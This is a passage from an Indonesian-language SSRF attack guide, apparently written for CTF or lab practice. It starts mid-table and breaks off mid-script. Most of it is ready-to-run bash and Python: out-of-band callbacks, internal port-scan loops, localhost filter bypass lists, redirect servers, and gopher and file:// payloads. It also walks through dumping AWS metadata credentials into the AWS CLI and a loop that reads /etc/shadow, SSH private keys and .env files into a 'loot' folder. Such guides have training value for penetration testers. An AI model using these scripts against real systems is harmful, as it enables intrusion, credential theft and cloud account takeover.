|`aws sts get-caller-identity` gagal|Session token hilang|Simpan `aws_session_token` bila diberikan|
|Gopher payload rusak|CRLF/URL encoding salah|Gunakan Gopherus dan inspect raw payload|
|Redis `+PONG` tidak terlihat|SSRF endpoint tidak return raw TCP response|Gunakan timing/OOB atau another protocol primitive|
|Redis chain ke SSH gagal|Filesystem/SSH/path/permission mismatch|Validasi setiap prerequisite satu per satu|
|Kubernetes API tidak accessible|Service account/network policy|Confirm port and endpoint|
|Kubelet requires auth|Authentication enabled|SSRF saja belum cukup|
|IMDS request works directly but not through SSRF|Fetcher cannot route link-local address|Inspect proxy/network restrictions|

---

# 🧠 SSRF Muscle Memory

Jangan langsung berpikir:

```text
"SSRF = 169.254.169.254"
```

Workflow yang benar:

```text
URL Sink
   │
   ▼
External Callback
   │
   ▼
Server-Side Fetch?
   │
   ▼
localhost
   │
   ▼
Internal Services
   │
   ▼
Metadata
   │
   ▼
Filter
   │
   ▼
Alternative Representation
   │
   ▼
Alternative Protocol
   │
   ▼
Internal Primitive
   │
   ▼
Chain
```

---

# 🔎 SSRF Proof Levels

```text
LEVEL 0
User-controlled URL
        │
        ▼
Candidate

LEVEL 1
External callback
        │
        ▼
Blind SSRF confirmed

LEVEL 2
Response contains target content
        │
        ▼
Full SSRF

LEVEL 3
localhost reachable
        │
        ▼
Internal SSRF

LEVEL 4
Internal service identified
        │
        ▼
Pivot

LEVEL 5
Metadata / credential access
        │
        ▼
Cloud pivot

LEVEL 6
RCE chain
```

---

# ⚠️ Jangan Salah Menginterpretasikan Hasil

```text
External URL fetched
=
server-side fetch

BUT

server-side fetch
≠
localhost access

localhost access
≠
cloud metadata access

cloud metadata access
≠
IAM admin

IAM credential
≠
RCE
```

Setiap tahap harus dibuktikan.

---

# ✅ Final SSRF Checklist

```text
[ ] URL-controlled input ditemukan
[ ] Server-side fetch confirmed
[ ] External callback tested
[ ] Full vs blind SSRF classified
[ ] localhost tested
[ ] 127.0.0.1 tested
[ ] localhost hostname tested
[ ] ::1 tested
[ ] Internal ports tested
[ ] Response/status/timing baseline recorded
[ ] Internal service identified
[ ] Admin panel tested
[ ] Elasticsearch tested
[ ] Redis tested
[ ] Docker tested
[ ] Kubernetes tested
[ ] Jenkins tested
[ ] AWS metadata checked where relevant
[ ] AWS IMDSv1/v2 understood
[ ] GCP metadata checked where relevant
[ ] Azure metadata checked where relevant
[ ] Credential expiration checked
[ ] Cloud identity verified
[ ] SSRF filters identified
[ ] IP representation bypass understood
[ ] Domain bypass understood
[ ] URL parser mismatch understood
[ ] Redirect behavior checked
[ ] DNS rebinding understood
[ ] file:// behavior checked
[ ] gopher:// behavior checked
[ ] Blind SSRF tested with interactsh
[ ] Semi-blind side channels checked
[ ] Internal API pivot tested
[ ] Potential chain documented
[ ] Every finding reproduced manually
```

---

# 🎯 Quick CTF Recipe

Misalnya ditemukan:

```text
POST /fetch
url=https://example.com
```

### 1. External callback

```bash
curl -G \
--data-urlencode \
'url=http://YOUR-INTERACTSH-ID.oast.fun/' \
http://TARGET/fetch
```

Callback?

```text
YES → SSRF confirmed
```

---

### 2. Localhost

```bash
curl -G \
--data-urlencode \
'url=http://127.0.0.1/' \
http://TARGET/fetch
```

---

### 3. Common internal service

```bash
curl -G \
--data-urlencode \
'url=http://127.0.0.1:8080/' \
http://TARGET/fetch
```

```bash
curl -G \
--data-urlencode \
'url=http://127.0.0.1:9200/' \
http://TARGET/fetch
```

```bash
curl -G \
--data-urlencode \
'url=http://127.0.0.1:2375/version' \
http://TARGET/fetch
```

---

### 4. AWS

```bash
curl -G \
--data-urlencode \
'url=http://169.254.169.254/latest/meta-data/' \
http://TARGET/fetch
```

---

### 5. Filter

Coba:

```text
127.0.0.1
localhost
::1
2130706433
0x7f000001
127.0.0.1.nip.io
```

hanya bila validator memang menunjukkan adanya filtering.

---

### 6. Redirect

```text
Target
  │
  ▼
ATTACKER
  │
  ▼
302
  │
  ▼
127.0.0.1:8080
```

---

### 7. Advanced

```text
gopher://127.0.0.1:6379/_
```

Test protocol-specific target.

---

# 🧩 One-Line Mental Model

```text
SSRF = "Bukan saya yang mengakses server internal,
tetapi saya membuat SERVER TARGET yang mengaksesnya untuk saya."
```

---

# 22 — SSRF Complete Attack Workflow — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"        # IP tun0 kamu
export LPORT="4444"
mkdir -p ~/ssrf_loot/{responses,creds,payloads,scripts}
cd ~/ssrf_loot

# Setup interactsh untuk OOB detection (jalankan di terminal terpisah)
interactsh-client &
# Catat callback URL yang diberikan, contoh: abc123.oast.fun
export CALLBACK="abc123.oast.fun"

echo "[*] Target: $TARGET | LHOST: $LHOST | Callback: $CALLBACK"
```

**Output yang diharapkan:**

text

```
[*] Target: 10.10.11.200 | LHOST: 10.10.14.5 | Callback: abc123.oast.fun
[INF] Listing 1 payload for OOB testing
abc123.oast.fun
```

---

## ═══════════════════════════════════════

## FASE 0: IDENTIFIKASI SSRF SINK

## ═══════════════════════════════════════

> **Tujuan:** Temukan parameter yang menerima URL dan dikirim ke server untuk di-fetch.

### Langkah 0.1 — Scan Parameter SSRF Kandidat

Bash

```
# Command 1: Cari parameter URL di semua response (gunakan Burp/manual)
# Target parameter yang paling sering jadi SSRF sink:
cat << 'EOF'
Parameter Prioritas TINGGI (cek ini dulu):
  url=          uri=          dest=         destination=
  src=          source=       image=        image_url=
  fetch=        load=         proxy=        callback=
  webhook=      webhook_url=  link=         target=
  feed=         import=       remote=       remote_url=
  endpoint=     api_url=      import_url=   redirect=
EOF

# Command 2: Cari di source code / JavaScript files
curl -s http://$TARGET/ | grep -oE "(url|uri|src|dest|fetch|load|proxy|webhook|image|remote)=['\"][^'\"]*['\"]"

# Command 3: Cari endpoint yang accept URL via fuzzing
ffuf -u http://$TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/actions.txt \
     -mc 200,301,302,401,403 -o endpoints.txt
```

**OUTPUT BERHASIL ✅ — Menemukan endpoint dengan URL parameter:**

text

```
POST /api/fetch
Content-Type: application/json
{"url": "https://example.com/image.jpg"}

# ATAU di form HTML:
<input name="url" type="text">
<input name="webhook_url" type="text">
```

➡️ Catat endpoint dan parameter name:

Bash

```
export SSRF_ENDPOINT="http://$TARGET/api/fetch"
export SSRF_PARAM="url"
echo "SSRF Candidate: $SSRF_ENDPOINT?$SSRF_PARAM=VALUE"
```

➡️ **Lanjut ke Langkah 0.2**

**OUTPUT GAGAL ❌ — Tidak menemukan parameter URL:**

text

```
# Tidak ada hasil dari grep
# Coba pendekatan lain:
```

➡️ Cari di tempat yang lebih tersembunyi:

Bash

```
# Cari di JavaScript files
curl -s http://$TARGET/ | grep -oE "src=['\"][^'\"]*\.js['\"]" | \
    sed "s/src=['\"]//g;s/['\"]//g" | \
    while read f; do curl -s "http://$TARGET$f"; done | \
    grep -oE "(url|fetch|load|proxy)['\s]*[:=]['\s]*['\"][^'\"]*"

# Cari endpoint dengan fitur yang biasanya punya SSRF:
# - /preview, /thumbnail, /screenshot, /pdf, /export, /import
# - /webhook, /callback, /notify, /ping
# - /avatar, /profile-image, /cover
curl -s http://$TARGET/sitemap.xml | grep -oE "https?://[^<]+"
```

---

### Langkah 0.2 — Konfirmasi SSRF (OOB Test)

Bash

```
# Command 1: Test dengan interactsh callback (PALING RELIABLE)
curl -i -X POST \
  $SSRF_ENDPOINT \
  -H "Content-Type: application/json" \
  -d "{\"$SSRF_PARAM\": \"http://$CALLBACK/ssrf-test-$(date +%s)\"}"

# Command 2: Jika POST dengan form-data
curl -i -X POST \
  $SSRF_ENDPOINT \
  --data-urlencode "$SSRF_PARAM=http://$CALLBACK/ssrf-test"

# Command 3: Jika GET parameter
curl -i -G \
  $SSRF_ENDPOINT \
  --data-urlencode "$SSRF_PARAM=http://$CALLBACK/ssrf-test"

# Command 4: Setup listener lokal sebagai alternatif
python3 -m http.server 8080 &
curl -i -X POST $SSRF_ENDPOINT \
  -d "$SSRF_PARAM=http://$LHOST:8080/ssrf-probe"
```

**OUTPUT BERHASIL ✅ — Callback diterima (interactsh):**

text

```
[INF] HTTP interaction from 10.10.11.200 at 2024-01-15 10:23:45
[INF] DNS interaction from 10.10.11.200 at 2024-01-15 10:23:44

# DI TERMINAL python http.server:
10.10.11.200 - - [15/Jan/2024 10:23:45] "GET /ssrf-probe HTTP/1.1" 200 -
```

**Cara baca dan tindakan:**

|Signal|Arti|Langkah|
|---|---|---|
|HTTP + DNS callback|Full SSRF, server fetch sepenuhnya|Lanjut Fase 1 (Full SSRF)|
|Hanya DNS callback|Blind SSRF, resolve tapi tidak HTTP|Lanjut Fase 4 (Blind SSRF)|
|Tidak ada callback tapi response berbeda|Semi-blind SSRF|Lanjut Fase 4|
|Response berisi content dari URL kita|Full SSRF visible|Lanjut Fase 1|

Bash

```
# SIMPAN INFO SSRF:
export SSRF_TYPE="full"  # atau "blind" atau "semi-blind"
echo "SSRF Type: $SSRF_TYPE" >> ~/ssrf_loot/ssrf_notes.txt
echo "Endpoint: $SSRF_ENDPOINT" >> ~/ssrf_loot/ssrf_notes.txt
echo "Parameter: $SSRF_PARAM" >> ~/ssrf_loot/ssrf_notes.txt
```

**OUTPUT GAGAL ❌ — Tidak ada callback, response sama:**

text

```
HTTP/1.1 200 OK
{"status": "ok", "content": ""}

# atau
HTTP/1.1 400 Bad Request
{"error": "Invalid URL"}
```

➡️ Coba variasi:

Bash

```
# Variasi 1: Coba format URL berbeda
curl -i -X POST $SSRF_ENDPOINT \
  -d "$SSRF_PARAM=https://$CALLBACK/"

# Variasi 2: Coba encoding
curl -i -X POST $SSRF_ENDPOINT \
  -d "$SSRF_PARAM=http%3A%2F%2F$CALLBACK%2F"

# Variasi 3: Coba dalam JSON
curl -i -X POST $SSRF_ENDPOINT \
  -H "Content-Type: application/json" \
  -d "{\"$SSRF_PARAM\": \"http://$CALLBACK/\"}"

# Variasi 4: Coba nested JSON
curl -i -X POST $SSRF_ENDPOINT \
  -H "Content-Type: application/json" \
  -d "{\"config\": {\"$SSRF_PARAM\": \"http://$CALLBACK/\"}}"
```

---

## ═══════════════════════════════════════

## FASE 1: LOCALHOST & INTERNAL SERVICE ENUMERATION

## ═══════════════════════════════════════

> **Tujuan:** Setelah SSRF confirmed, probe localhost untuk menemukan internal services.

### Langkah 1.1 — Ambil Baseline Response

Bash

```
# WAJIB dilakukan dulu — kita perlu baseline untuk compare
# Command 1: Baseline dengan URL public yang pasti accessible
curl -sS -o /dev/null \
  -w "code=%{http_code} size=%{size_download} time=%{time_total}\n" \
  -X POST $SSRF_ENDPOINT \
  -d "$SSRF_PARAM=https://example.com/" \
  | tee ~/ssrf_loot/baseline_public.txt

# Command 2: Baseline dengan URL yang pasti tidak ada
curl -sS -o /dev/null \
  -w "code=%{http_code} size=%{size_download} time=%{time_total}\n" \
  -X POST $SSRF_ENDPOINT \
  -d "$SSRF_PARAM=http://192.0.2.1/" \
  | tee ~/ssrf_loot/baseline_closed.txt

echo "Public baseline: $(cat ~/ssrf_loot/baseline_public.txt)"
echo "Closed baseline: $(cat ~/ssrf_loot/baseline_closed.txt)"
```

**OUTPUT BERHASIL ✅:**

text

```
Public baseline:  code=200 size=1256 time=0.324
Closed baseline:  code=502 size=87   time=5.003
```

➡️ Catat perbedaan:

Bash

```
# Perbedaan ini adalah "fingerprint" untuk membedakan open vs closed port nanti
# code=200/size=1256 = open (mirip public)
# code=502/timeout  = closed/filtered
```

---

### Langkah 1.2 — Probe Localhost

Bash

```
# Command 1: Test localhost dengan semua representasi
for url in \
  "http://127.0.0.1/" \
  "http://localhost/" \
  "http://[::1]/" \
  "http://2130706433/" \
  "http://0x7f000001/" \
  "http://127.1/" \
  "http://127.0.0.1.nip.io/"; do
    
  result=$(curl -sS -o /tmp/ssrf_resp.txt \
    -w "code=%{http_code} size=%{size_download} time=%{time_total}" \
    -X POST $SSRF_ENDPOINT \
    --data-urlencode "$SSRF_PARAM=$url" 2>/dev/null)
  
  body_snippet=$(head -c 100 /tmp/ssrf_resp.txt 2>/dev/null | tr '\n' ' ')
  echo "URL: $url → $result | Body: $body_snippet"
done | tee ~/ssrf_loot/localhost_probe.txt
```

**OUTPUT BERHASIL ✅ — Localhost accessible:**

text

```
URL: http://127.0.0.1/ → code=200 size=4312 time=0.041 | Body: <html><title>Internal Service</title>
URL: http://localhost/ → code=200 size=4312 time=0.040 | Body: <html><title>Internal Service</title>
URL: http://[::1]/    → code=502 size=87   time=5.001 | Body: Bad Gateway
```

➡️ **Perhatikan mana yang berhasil!** Catat representasi yang lolos filter:

Bash

```
export WORKING_LOCALHOST="http://127.0.0.1"
echo "Working localhost representation: $WORKING_LOCALHOST" >> ~/ssrf_loot/ssrf_notes.txt
```

➡️ **Lanjut ke Langkah 1.3**

**OUTPUT GAGAL ❌ — Semua localhost diblokir:**

text

```
URL: http://127.0.0.1/ → code=403 size=45 time=0.012 | Body: {"error": "Blocked IP"}
URL: http://localhost/ → code=403 size=45 time=0.012 | Body: {"error": "Blocked"}
URL: http://[::1]/    → code=403 size=45 time=0.012 | Body: {"error": "Blocked"}
```

➡️ Ada filter aktif, lanjut ke **Fase 3 (Filter Bypass)**. Jangan skip dulu, coba redirect bypass:

Bash

```
# Setup redirect server cepat
cat > /tmp/redirect.py << 'EOF'
from http.server import BaseHTTPRequestHandler, HTTPServer
import sys

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1/"

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header("Location", TARGET_URL)
        self.end_headers()
    def log_message(self, fmt, *args): return

HTTPServer(("0.0.0.0", 8888), Handler).serve_forever()
EOF

python3 /tmp/redirect.py "http://127.0.0.1:8080/" &
echo "[*] Redirect server running, test: $SSRF_ENDPOINT dengan url=http://$LHOST:8888/"
```

---

### Langkah 1.3 — Internal Port Scanning

Bash

```
# Gunakan script ssrf_port_scan.sh dari dokumen SSRF fundamentals
# Atau manual loop:

# Prioritas port list (scan ini dulu, yang paling sering ada)
PRIORITY_PORTS="80 443 8080 8443 8000 3000 5000 9000 9200 6379 3306 5432 2375 10250 8001"

echo "=== SSRF Port Scan - Priority Ports ===" | tee ~/ssrf_loot/port_scan.txt

for port in $PRIORITY_PORTS; do
  result=$(curl -sS -o /tmp/port_resp.txt \
    -w "code=%{http_code} size=%{size_download} time=%{time_total}" \
    --max-time 5 \
    -X POST $SSRF_ENDPOINT \
    --data-urlencode "$SSRF_PARAM=$WORKING_LOCALHOST:$port/" 2>/dev/null)
  
  body_100=$(head -c 100 /tmp/port_resp.txt 2>/dev/null | tr '\n' ' ' | tr -d '\r')
  status=$(echo $result | grep -oE "code=[0-9]+")
  
  # Classify berdasarkan baseline
  if echo "$result" | grep -qE "code=(200|201|301|302|401|403|404)"; then
    flag="[OPEN/CANDIDATE]"
  elif echo "$result" | grep -qE "time=[4-9]\.[0-9]|time=5\."; then
    flag="[TIMEOUT]"
  else
    flag="[CLOSED]"
  fi
  
  echo "Port $port: $result $flag | $body_100" | tee -a ~/ssrf_loot/port_scan.txt
done

echo ""
echo "=== CANDIDATES ==="
grep "OPEN/CANDIDATE" ~/ssrf_loot/port_scan.txt
```

**OUTPUT BERHASIL ✅ — Port terbuka ditemukan:**

text

```
Port 80:   code=200 size=4312 time=0.041 [OPEN/CANDIDATE] | <html><h1>Internal App</h1>
Port 8080: code=200 size=9823 time=0.089 [OPEN/CANDIDATE] | <title>Jenkins</title>
Port 9200: code=200 size=312  time=0.052 [OPEN/CANDIDATE] | {"cluster_name":"elasticsearch"}
Port 6379: code=502 size=0    time=0.038 [CLOSED]          |
Port 3306: code=502 size=0    time=0.040 [CLOSED]          |
Port 3000: code=200 size=2100 time=0.061 [OPEN/CANDIDATE] | Grafana

=== CANDIDATES ===
Port 80:   [OPEN/CANDIDATE]
Port 8080: [OPEN/CANDIDATE] ← Jenkins!
Port 9200: [OPEN/CANDIDATE] ← Elasticsearch!
Port 3000: [OPEN/CANDIDATE] ← Grafana!
```

**Cara baca response per service:**

|Port|Service|Response Body Clue|Tindakan|
|---|---|---|---|
|8080|Jenkins|`<title>Jenkins</title>`|→ Fase 6D (Jenkins RCE)|
|9200|Elasticsearch|`"cluster_name"`|Dump data via ES API|
|6379|Redis (HTTP mode)|`wrong version` / `-ERR`|→ Fase 6A (Gopher Redis)|
|2375|Docker API|`{"ApiVersion"`|→ Docker RCE|
|8001/10250|Kubernetes|`{"kind":"APIVersions"`|→ K8s pivot|
|3000|Grafana|`Grafana` title|Login bypass|

Bash

```
# Simpan candidates
CANDIDATES=$(grep "OPEN/CANDIDATE" ~/ssrf_loot/port_scan.txt | awk '{print $2}' | tr -d ':')
echo "Open ports: $CANDIDATES" >> ~/ssrf_loot/ssrf_notes.txt
```

**OUTPUT SEMUA TIMEOUT ❌:**

text

```
Port 80:   code=504 size=0 time=5.001 [TIMEOUT]
Port 8080: code=504 size=0 time=5.002 [TIMEOUT]
```

➡️ Internal network tidak bisa di-reach, atau timeout sangat ketat. Coba:

Bash

```
# Kurangi timeout dan bandingkan timing lebih teliti
# 0.04s = closed, >1s = timeout/filtered, 0.1-0.5s = POSSIBLY OPEN
curl -sS -o /dev/null -w "time=%{time_total}\n" --max-time 2 \
  -X POST $SSRF_ENDPOINT --data-urlencode "$SSRF_PARAM=http://127.0.0.1:80/"
```

---

### Langkah 1.4 — Eksplorasi Service yang Ditemukan

Bash

```
# Setelah tahu port mana yang open, eksplorasi lebih dalam

# Contoh: Port 8080 = Jenkins
# Step 1: Ambil homepage lengkap
curl -s -X POST $SSRF_ENDPOINT \
  --data-urlencode "$SSRF_PARAM=http://127.0.0.1:8080/" \
  -o ~/ssrf_loot/responses/port_8080_index.html

# Analisis response
cat ~/ssrf_loot/responses/port_8080_index.html | \
  grep -iE "(title|version|powered|server|jenkins|grafana|admin)" | head -20

# Step 2: Coba endpoint-endpoint umum per service
for path in "/" "/login" "/admin" "/api" "/api/v1" "/manage" "/actuator" \
            "/console" "/dashboard" "/metrics" "/.git/HEAD" "/robots.txt"; do
  code=$(curl -sS -o /dev/null -w "%{http_code}" \
    -X POST $SSRF_ENDPOINT \
    --data-urlencode "$SSRF_PARAM=http://127.0.0.1:8080$path")
  echo "Path: $path → HTTP $code"
done | tee ~/ssrf_loot/responses/port_8080_paths.txt
```

**OUTPUT BERHASIL ✅ — Jenkins tanpa auth:**

text

```
Path: /         → HTTP 200
Path: /login    → HTTP 200
Path: /admin    → HTTP 302
Path: /api      → HTTP 200
Path: /manage   → HTTP 200 ← Management interface!
Path: /script   → HTTP 200 ← Groovy Script Console!
Path: /actuator → HTTP 200 ← Spring Boot Actuator!
```

➡️ `/script` accessible tanpa auth → **LANGSUNG ke Fase 6D (Jenkins Script Console RCE)**

**OUTPUT BERHASIL ✅ — Elasticsearch:**

Bash

```
# Dump semua data dari Elasticsearch
curl -s -X POST $SSRF_ENDPOINT \
  --data-urlencode "$SSRF_PARAM=http://127.0.0.1:9200/_cat/indices" \
  -o ~/ssrf_loot/responses/es_indices.txt

cat ~/ssrf_loot/responses/es_indices.txt

# Dump specific index
curl -s -X POST $SSRF_ENDPOINT \
  --data-urlencode "$SSRF_PARAM=http://127.0.0.1:9200/users/_search?size=100" \
  | python3 -m json.tool | grep -E "(password|secret|token|key|email|user)"
```

---

## ═══════════════════════════════════════

## FASE 2: CLOUD METADATA SSRF

## ═══════════════════════════════════════

> **Jalankan PARALEL dengan Fase 1** — ini sering jadi jackpot di cloud environment.

### Langkah 2.1 — Cloud Detection

Bash

```
# Jalankan semua test cloud sekaligus — lihat mana yang respond
echo "=== Cloud Metadata Detection ===" | tee ~/ssrf_loot/cloud_check.txt

# AWS IMDSv1
result_aws=$(curl -sS -o /tmp/aws_resp.txt \
  -w "code=%{http_code} size=%{size_download}" --max-time 5 \
  -X POST $SSRF_ENDPOINT \
  --data-urlencode "$SSRF_PARAM=http://169.254.169.254/latest/meta-data/")
echo "AWS IMDS: $result_aws | $(head -c 200 /tmp/aws_resp.txt)" | tee -a ~/ssrf_loot/cloud_check.txt

# GCP (tanpa header — kemungkinan gagal tapi cek dulu)
result_gcp=$(curl -sS -o /tmp/gcp_resp.txt \
  -w "code=%{http_code} size=%{size_download}" --max-time 5 \
  -X POST $SSRF_ENDPOINT \
  --data-urlencode "$SSRF_PARAM=http://metadata.google.internal/computeMetadata/v1/")
echo "GCP Metadata: $result_gcp | $(head -c 200 /tmp/gcp_resp.txt)" | tee -a ~/ssrf_loot/cloud_check.txt

# Azure
result_azure=$(curl -sS -o /tmp/azure_resp.txt \
  -w "code=%{http_code} size=%{size_download}" --max-time 5 \
  -X POST $SSRF_ENDPOINT \
  --data-urlencode "$SSRF_PARAM=http://169.254.169.254/metadata/instance?api-version=2021-02-01")
echo "Azure Metadata: $result_azure | $(head -c 200 /tmp/azure_resp.txt)" | tee -a ~/ssrf_loot/cloud_check.txt

cat ~/ssrf_loot/cloud_check.txt
```

**OUTPUT BERHASIL ✅ — AWS IMDSv1 accessible:**

text

```
AWS IMDS: code=200 size=141 | ami-id
                               hostname
                               instance-id
                               iam/
                               network/
                               public-ipv4
```

➡️ **AWS environment dengan IMDSv1! Langsung dump credentials:**

Bash

```
# Step 1: List IAM roles
curl -s -X POST $SSRF_ENDPOINT \
  --data-urlencode "$SSRF_PARAM=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  | tee ~/ssrf_loot/creds/aws_role_name.txt

export AWS_ROLE=$(cat ~/ssrf_loot/creds/aws_role_name.txt | tr -d '\n')
echo "IAM Role found: $AWS_ROLE"

# Step 2: Dump credentials
curl -s -X POST $SSRF_ENDPOINT \
  --data-urlencode "$SSRF_PARAM=http://169.254.169.254/latest/meta-data/iam/security-credentials/$AWS_ROLE" \
  | tee ~/ssrf_loot/creds/aws_credentials.json

# Step 3: Juga dump info berguna lain
curl -s -X POST $SSRF_ENDPOINT \
  --data-urlencode "$SSRF_PARAM=http://169.254.169.254/latest/user-data/" \
  | tee ~/ssrf_loot/creds/aws_userdata.txt

curl -s -X POST $SSRF_ENDPOINT \
  --data-urlencode "$SSRF_PARAM=http://169.254.169.254/latest/dynamic/instance-identity/document" \
  | tee ~/ssrf_loot/creds/aws_identity.json
```

**OUTPUT JACKPOT ✅ — AWS Credentials:**

JSON

```
{
  "AccessKeyId": "ASIA_EXAMPLE_TEMP_KEY",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "AQoDYXdzEJr...",
  "Expiration": "2024-01-15T12:34:56Z"
}
```

➡️ **Simpan dan gunakan credentials:**

Bash

```
# Parse dan simpan
ACCESS_KEY=$(cat ~/ssrf_loot/creds/aws_credentials.json | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['AccessKeyId'])")
SECRET_KEY=$(cat ~/ssrf_loot/creds/aws_credentials.json | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['SecretAccessKey'])")
SESSION_TOKEN=$(cat ~/ssrf_loot/creds/aws_credentials.json | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['Token'])")

# Setup AWS CLI
mkdir -p ~/.aws
cat > ~/.aws/credentials << EOF
[default]
aws_access_key_id = $ACCESS_KEY
aws_secret_access_key = $SECRET_KEY
aws_session_token = $SESSION_TOKEN
EOF
chmod 600 ~/.aws/credentials

# Verify identity
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name $AWS_ROLE
```

**OUTPUT BERHASIL ✅ — AWS Identity confirmed:**

JSON

```
{
    "UserId": "AROA...",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:role/webapp-role"
}
```

➡️ Lanjut ke `[🚀 Bagian 0: Konteks & Lab Setup](/docs/aws-pentest)` untuk full cloud exploitation.

**OUTPUT GAGAL ❌ — AWS 401 / IMDSv2 Required:**

text

```
code=401 | {"message": "Token required"}
# atau
code=400 | Bad Request
```

➡️ IMDSv2 diperlukan. Ini lebih kompleks — butuh PUT request dengan custom header:

Bash

```
# Cek apakah SSRF endpoint bisa forward custom headers atau PUT method
# Jika SSRF hanya GET → IMDSv2 sering tidak bisa dibypass dengan SSRF simple
# Cari apakah ada CRLF injection atau header injection untuk menambah X-aws-ec2-metadata-token-ttl-seconds
# Google: "IMDSv2 bypass SSRF" + nama aplikasi/framework target
echo "[!] IMDSv2 diblokir - perlu PUT method + custom header support"
echo "[!] Search: 'IMDSv2 SSRF bypass' untuk teknik terbaru"
```

---

## ═══════════════════════════════════════

## FASE 3: SSRF FILTER BYPASS

## ═══════════════════════════════════════

> **Masuk sini jika Fase 1 localhost diblokir oleh filter.**

### Langkah 3.1 — Identify Filter Type

Bash

```
# Coba semua representasi localhost sekaligus dan analisis response
declare -A BYPASS_TESTS
BYPASS_TESTS=(
  ["127.0.0.1"]="http://127.0.0.1/"
  ["localhost"]="http://localhost/"
  ["IPv6_loopback"]="http://[::1]/"
  ["IPv6_full"]="http://[0:0:0:0:0:0:0:1]/"
  ["decimal_int"]="http://2130706433/"
  ["hex_int"]="http://0x7f000001/"
  ["octal"]="http://0177.0.0.1/"
  ["short_form"]="http://127.1/"
  ["zero_padded"]="http://127.000.000.001/"
  ["ipv4_mapped_ipv6"]="http://[::ffff:127.0.0.1]/"
  ["credential_syntax"]="http://attacker@127.0.0.1/"
  ["case_variation"]="HTTP://127.0.0.1/"
  ["nip_io"]="http://127.0.0.1.nip.io/"
  ["sslip_io"]="http://127.0.0.1.sslip.io/"
)

echo "=== IP Representation Bypass Tests ===" | tee ~/ssrf_loot/bypass_tests.txt

for label in "${!BYPASS_TESTS[@]}"; do
  url="${BYPASS_TESTS[$label]}"
  result=$(curl -sS -o /tmp/bypass_resp.txt \
    -w "code=%{http_code} size=%{size_download}" --max-time 5 \
    -X POST $SSRF_ENDPOINT \
    --data-urlencode "$SSRF_PARAM=$url" 2>/dev/null)
  body=$(head -c 50 /tmp/bypass_resp.txt 2>/dev/null | tr '\n' ' ')
  echo "[$label] $url → $result | $body" | tee -a ~/ssrf_loot/bypass_tests.txt
done
```

**OUTPUT BERHASIL ✅ — Bypass ditemukan:**

text

```
[127.0.0.1]      http://127.0.0.1/ → code=403 size=45  | {"error": "Blocked"}
[localhost]       http://localhost/ → code=403 size=45  | {"error": "Blocked"}
[decimal_int]     http://2130706433/ → code=200 size=4312 | <html>Internal ← BYPASS!
[hex_int]         http://0x7f000001/ → code=200 size=4312 | <html>Internal ← BYPASS!
[nip_io]          http://127.0.0.1.nip.io/ → code=403 → Blocked
```

➡️ Catat bypass yang berhasil:

Bash

```
export WORKING_BYPASS="http://2130706433"  # Gunakan ini untuk semua langkah selanjutnya
echo "Working bypass: $WORKING_BYPASS" >> ~/ssrf_loot/ssrf_notes.txt
# Lanjut ke Langkah 1.3 tapi gunakan $WORKING_BYPASS sebagai pengganti $WORKING_LOCALHOST
```

**OUTPUT SEMUA DIBLOKIR ❌:**

text

```
Semua representasi IP return code=403
```

➡️ Filter mungkin berbasis DNS/hostname. Coba redirect bypass:

Bash

```
# Setup redirect server
cat > /tmp/ssrf_redirect.py << 'EOF'
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        path = self.path
        # Extract target dari path: /127.0.0.1/8080/admin → redirect ke internal
        target = "http://127.0.0.1:8080" + path.replace("/proxy", "")
        self.send_response(302)
        self.send_header("Location", target)
        self.end_headers()
    def log_message(self, fmt, *args):
        print(f"[REDIRECT] {self.client_address[0]} → {self.path}")

HTTPServer(("0.0.0.0", 8888), Handler).serve_forever()
EOF

python3 /tmp/ssrf_redirect.py &
echo "[*] Redirect server di $LHOST:8888"

# Test redirect bypass
curl -s -X POST $SSRF_ENDPOINT \
  --data-urlencode "$SSRF_PARAM=http://$LHOST:8888/"
# Jika redirect server di-hit → filter tidak block redirect destination
```

---

### Langkah 3.2 — Protocol Bypass

Bash

```
# Test protocol lain yang mungkin tidak difilter
PROTOCOLS=(
  "file:///etc/hostname"
  "file:///etc/passwd"
  "file:///etc/hosts"
  "file:///proc/net/tcp"
  "file:///var/www/html/index.php"
  "dict://127.0.0.1:6379/info"
  "gopher://127.0.0.1:6379/_PING%0d%0a"
)

echo "=== Protocol Bypass Tests ===" | tee ~/ssrf_loot/protocol_tests.txt

for url in "${PROTOCOLS[@]}"; do
  result=$(curl -sS -o /tmp/proto_resp.txt \
    -w "code=%{http_code} size=%{size_download}" --max-time 5 \
    -X POST $SSRF_ENDPOINT \
    --data-urlencode "$SSRF_PARAM=$url" 2>/dev/null)
  body=$(head -c 100 /tmp/proto_resp.txt 2>/dev/null | tr '\n' ' ')
  echo "PROTO: $url → $result | $body" | tee -a ~/ssrf_loot/protocol_tests.txt
done
```

**OUTPUT BERHASIL ✅ — file:// Works:**

text

```
PROTO: file:///etc/hostname → code=200 size=7  | web01
PROTO: file:///etc/passwd   → code=200 size=1823 | root:x:0:0:root:/root:/bin/bash...
```

➡️ Baca file sensitif:

Bash

```
# Baca file-file penting
for f in /etc/passwd /etc/shadow /etc/hosts /proc/net/tcp \
          ~/.ssh/id_rsa /var/www/html/.env /app/config.py \
          /app/.env /home/www-data/.ssh/id_rsa; do
  content=$(curl -s -X POST $SSRF_ENDPOINT \
    --data-urlencode "$SSRF_PARAM=file://$f" 2>/dev/null)
  if [ -n "$content" ]; then
    echo "=== $f ===" | tee -a ~/ssrf_loot/creds/file_loot.txt
